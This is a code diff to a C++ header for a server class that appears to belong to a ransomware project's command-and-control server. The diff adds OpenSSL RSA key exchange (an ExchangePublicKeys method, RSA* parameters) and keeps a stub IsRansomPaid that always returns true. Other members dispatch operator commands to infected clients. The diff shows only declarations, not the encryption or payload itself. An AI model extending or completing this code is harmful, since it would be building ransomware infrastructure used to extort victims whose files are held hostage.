@@ -9,6 +9,9 @@
 #include <mutex>
 #include <iostream>
 #include <openssl/bio.h>
+#include <openssl/rsa.h>
+
+#define OPENSSL_NO_DEPRECATED
 
 using JSON = nlohmann::json;
 
@@ -63,7 +66,7 @@ public:
 	inline BOOL       IsServerRunning(const Server& s) const { return s.alive; }
 	inline Server     GetTCPServer()				   const { return this->m_TCPServerDetails; }
 	inline Server     GetUDPServer()				   const { return this->m_UDPServerDetails; }
-	const auto        ReadConfig()					   const { return this->m_Config; };
+	const inline auto ReadConfig()					   const { return this->m_Config; };
 
 protected:
 	/*
@@ -75,8 +78,8 @@ protected:
 		May be implemented someday...
 	*/
 	inline BOOL       IsRansomPaid(Client client) { return TRUE; } // return true always. 
-	RSAKeys		      GenerateRSAPair(); // only in server file so this logic isn't implemented client side
 	BOOL			  PerformRequest(ClientRequest req, Server on, long cuid = -1, sockaddr_in incoming = NetCommon::_default);
+	BOOL			  ExchangePublicKeys(long cuid);
 
 	/*
 		Wrapper for ReceiveData.
@@ -84,7 +87,7 @@ protected:
 		using the rsa key
 	*/
 	template <typename _Struct>
-	_Struct           ReceiveDataFrom(SOCKET s, BOOL encrypted = FALSE, BIO* rsaKey = {});
+	_Struct           ReceiveDataFrom(SOCKET s, BOOL encrypted = FALSE, RSA* rsaKey = {});
 	void			  RunUserInputOnClients();
 	BOOL			  HandleUserInput(unsigned int command, ServerCommand& outputCommand);
 
